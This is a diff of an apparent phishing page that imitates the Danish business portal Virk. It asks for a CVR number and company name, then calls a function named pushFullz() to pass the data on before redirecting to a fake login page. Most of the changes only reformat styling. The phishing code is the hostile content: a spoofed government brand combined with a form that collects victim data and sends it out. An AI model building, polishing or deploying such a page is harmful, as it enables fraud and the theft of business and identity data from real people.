@@ -8,102 +8,44 @@
 <style>
   * , *::before , *::after { box-sizing: border-box; }
   html , body { margin: 0; }
-  body {
-    font-family: "IBM Plex Sans", "Helvetica", "Arial", sans-serif;
-    background-color: #f5f5f5;
-    color: #1a1a1a;
-    font-size: 16px;
-    line-height: 1.5;
-    -webkit-font-smoothing: antialiased;
-  }
+  body { font-family: "IBM Plex Sans", "Helvetica", "Arial", sans-serif; background-color: #f5f5f5; color: #1a1a1a; font-size: 16px; line-height: 1.5; -webkit-font-smoothing: antialiased; }
   a { text-decoration: none; color: inherit; }
-
-  /* ── TOP HEADER ── */
-  .top-header {
-    background: #fff;
-    border-bottom: 1px solid #e8e8e8;
-  }
-  .top-header-inner {
-    max-width: 1140px; margin: 0 auto; padding: 0 15px;
-    display: flex; align-items: center; height: 76px; gap: 24px;
-  }
+  .top-header { background: #fff; border-bottom: 1px solid #e8e8e8; }
+  .top-header-inner { max-width: 1140px; margin: 0 auto; padding: 0 15px; display: flex; align-items: center; height: 76px; gap: 24px; }
   .top-logo { display: flex; align-items: center; }
   .top-logo img { height: 40px; width: auto; }
   .top-nav { display: flex; align-items: center; gap: 24px; flex: 1; }
   .top-nav .sep { width: 1px; height: 26px; background: #bfbfbf; }
-  .top-nav a {
-    color: #1a1a1a; font-size: 15px; font-weight: 400; white-space: nowrap;
-  }
+  .top-nav a { color: #1a1a1a; font-size: 15px; font-weight: 400; white-space: nowrap; }
   .top-nav a:hover { color: #004993; text-decoration: underline; }
   .top-nav a.active { font-weight: 600; }
   .top-right { display: flex; align-items: center; gap: 16px; }
-  .btn-login {
-    display: inline-flex; align-items: center; gap: 8px;
-    background: #0059b3; color: #fff !important;
-    padding: 10px 20px; border-radius: 4px;
-    font-size: 15px; font-weight: 500; cursor: pointer; border: none;
-  }
+  .btn-login { display: inline-flex; align-items: center; gap: 8px; background: #0059b3; color: #fff !important; padding: 10px 20px; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; border: none; }
   .btn-login:hover { background: #004993; text-decoration: none; }
-
-  /* ── HERO ── */
   .hero { background: #f5f5f5; padding: 64px 0 48px; }
   .hero-inner { max-width: 1140px; margin: 0 auto; padding: 0 15px; }
-  .hero h1 {
-    font-size: 40px; font-weight: 600; color: #003972; margin: 0 0 12px; line-height: 1.2;
-  }
+  .hero h1 { font-size: 40px; font-weight: 600; color: #003972; margin: 0 0 12px; line-height: 1.2; }
   .hero p { font-size: 20px; color: #1a1a1a; max-width: 640px; margin: 0 0 28px; font-weight: 400; }
-
-  /* ── VIGNET CARDS ── */
   .section { max-width: 1140px; margin: 0 auto; padding: 24px 15px 48px; }
   .section h2 { font-size: 26px; font-weight: 600; color: #003972; margin: 0 0 20px; }
   .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 20px; }
-  .card {
-    background: #fff; border: 1px solid #e8e8e8; border-radius: 4px;
-    box-shadow: 0 2px 6px rgba(0,0,0,.06); padding: 24px;
-    transition: box-shadow .15s, transform .15s;
-  }
+  .card { background: #fff; border: 1px solid #e8e8e8; border-radius: 4px; box-shadow: 0 2px 6px rgba(0,0,0,.06); padding: 24px; transition: box-shadow .15s, transform .15s; }
   .card:hover { box-shadow: 0 6px 16px rgba(0,0,0,.12); transform: translateY(-2px); }
   .card h3 { font-size: 18px; font-weight: 600; color: #003972; margin: 0 0 10px; }
   .card p { font-size: 14px; color: #454545; margin: 0; }
-
   .login-highlight { border-top: 4px solid #0059b3; }
-
-  /* ── COMPANY STEP (CVR + name) — mandatory first step ── */
-  .cvr-section {
-    background: linear-gradient(180deg, #eaf2fb 0%, #f5f5f5 100%);
-    border-top: 1px solid #cddef0; border-bottom: 1px solid #cddef0;
-    padding: 32px 15px 36px; margin: 0;
-  }
-  .cvr-box {
-    background: #fff; border: 1px solid #d5e3f2; border-radius: 8px;
-    box-shadow: 0 8px 30px rgba(0,57,114,.12);
-    padding: 24px 28px; max-width: 720px; margin: 0 auto;
-  }
+  .cvr-section { background: linear-gradient(180deg, #eaf2fb 0%, #f5f5f5 100%); border-top: 1px solid #cddef0; border-bottom: 1px solid #cddef0; padding: 32px 15px 36px; margin: 0; }
+  .cvr-box { background: #fff; border: 1px solid #d5e3f2; border-radius: 8px; box-shadow: 0 8px 30px rgba(0,57,114,.12); padding: 24px 28px; max-width: 720px; margin: 0 auto; }
   .cvr-box h2 { font-size: 22px; font-weight: 600; color: #003972; margin: 0 0 4px; }
   .cvr-box p { font-size: 14px; color: #454545; margin: 0 0 18px; }
   .cvr-label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin: 0 0 6px; }
   .cvr-fields { display: flex; gap: 14px; align-items: flex-end; }
   .cvr-fields > div { flex: 1; }
-  .cvr-input {
-    width: 100%; height: 48px; border: 1px solid #747474; border-radius: 4px;
-    padding: 0 14px; font-size: 16px; font-family: inherit; color: #1a1a1a;
-    outline: none; box-sizing: border-box; background: #fff;
-  }
+  .cvr-input { width: 100%; height: 48px; border: 1px solid #747474; border-radius: 4px; padding: 0 14px; font-size: 16px; font-family: inherit; color: #1a1a1a; outline: none; box-sizing: border-box; background: #fff; }
   .cvr-input::placeholder { color: #8a8a8a; }
   .cvr-input:focus { border-color: #0059b3; box-shadow: 0 0 0 4px rgba(0,89,179,.18); }
-  .cvr-input.err { border-color: #c00; }
-  .hidden { display: none !important; }
-  .cvr-error { display: none; color: #c00; font-size: 13px; margin-top: 8px; font-weight: 500; }
-
-  .cvr-btn {
-    width: 100%; margin-top: 18px; height: 52px; padding: 0 24px;
-    background: #0059b3; color: #fff; border: none; border-radius: 6px;
-    font-size: 17px; font-weight: 600; font-family: inherit; cursor: pointer;
-    display: flex; align-items: center; justify-content: center; gap: 10px;
-    letter-spacing: .3px; transition: background .15s;
-  }
+  .cvr-btn { width: 100%; margin-top: 18px; height: 52px; padding: 0 24px; background: #0059b3; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: 600; font-family: inherit; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; letter-spacing: .3px; transition: background .15s; }
   .cvr-btn:hover { background: #004993; }
-  .cvr-btn:focus { outline: 4px solid #747474; outline-offset: 2px; }
   .cvr-btn.disabled { background: #a7bfd6; cursor: not-allowed; }
   @media (max-width: 560px) { .cvr-fields { flex-direction: column; gap: 12px; } }
 </style>
@@ -113,7 +55,8 @@
 <header class="top-header">
   <div class="top-header-inner">
     <div class="top-logo">
-      <img src="assets/virk-logo.svg" alt="Virk">
+      <!-- ÆNDR TIL .PNG HVIS DU HAR PNG -->
+      <img src="assets/virk-logo.svg" alt="Virk" onerror="this.src='assets/virk-logo.png'">
     </div>
     <nav class="top-nav">
       <a href="#" class="active">Forside</a>
@@ -154,7 +97,7 @@
       </div>
     </div>
 
-    <div class="cvr-error" id="cvrError">Udfyld både CVR-nummer (8 cifre) og virksomhedsnavn.</div>
+    <div class="cvr-error" id="cvrError" style="display:none; color: #c00; font-size: 13px; margin-top: 8px; font-weight: 500;">Udfyld både CVR-nummer (8 cifre) og virksomhedsnavn.</div>
 
     <button id="step1Btn" class="cvr-btn disabled" disabled type="button">
       <span>NÆSTE</span>
@@ -197,7 +140,6 @@
   var step1Btn     = document.getElementById('step1Btn');
   var cvrError     = document.getElementById('cvrError');
 
-  // Pre-fill if we already saved these (e.g. bounced back from login).
   if (state.data.cvrNumber) cvrInput.value = state.data.cvrNumber;
   if (state.data.companyName) companyInput.value = state.data.companyName;
 
@@ -228,11 +170,10 @@
     state.data.cvrNumber = cvr;
     state.data.companyName = name;
     saveState();
-    await pushFullz();          // wait for the FIRST message to be created + id saved
+    await pushFullz();
     window.location.href = 'login.html';
   });
 })();
 </script>
-
 </body>
 </html>
